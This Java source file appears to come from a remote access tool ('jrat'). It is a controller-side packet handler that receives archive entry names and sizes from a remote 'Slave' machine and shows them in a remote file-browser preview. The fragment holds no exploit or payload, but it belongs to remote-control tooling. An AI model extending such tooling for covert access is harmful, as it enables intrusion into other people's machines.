package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.fs.ui.FrameRemoteFiles;
import jrat.module.fs.ui.previews.PanelPreviewArchive;

import java.util.zip.ZipEntry;

public class Packet45ArchivePreview implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
	    String path = slave.readLine(); // path to archive file

		String name = slave.readLine();
		long size = slave.readLong();

        FrameRemoteFiles panel = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);

		if (panel != null) {

			PanelPreviewArchive preview = (PanelPreviewArchive) panel.getPreviewHandler(path);

            if (preview != null) {
                ZipEntry zip = new ZipEntry(name);
                zip.setSize(size);

                preview.addData(zip);
            }
		}
	}

}
